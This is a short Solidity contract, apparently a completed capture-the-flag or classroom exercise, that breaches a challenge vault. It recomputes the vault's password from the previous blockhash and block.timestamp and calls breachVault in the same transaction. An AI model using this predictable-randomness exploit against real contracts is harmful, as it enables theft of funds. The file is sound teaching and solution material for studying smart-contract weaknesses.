// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVault04 {
    function breachVault(bytes32 _password) external returns (bool);
}

contract AttackVault04 {
    IVault04 public vault;

    // Constructor to set the address of the vault contract
    constructor(address _vaultAddress) {
        vault = IVault04(_vaultAddress);
    }

    // Function to perform the attack
    function attack() external returns (bool) {
        // =========================
        // YOUR CODE GOES HERE
        // vault.breachVault(<PASSWORD>);

        // Compute the password using on-chain values in the same transaction.
        bytes32 password = keccak256(
            abi.encodePacked(blockhash(block.number - 1), block.timestamp)
        );

        // Call the unlock function of the vault contract with the computed password
        return vault.breachVault(password);
        // =========================
    }
}
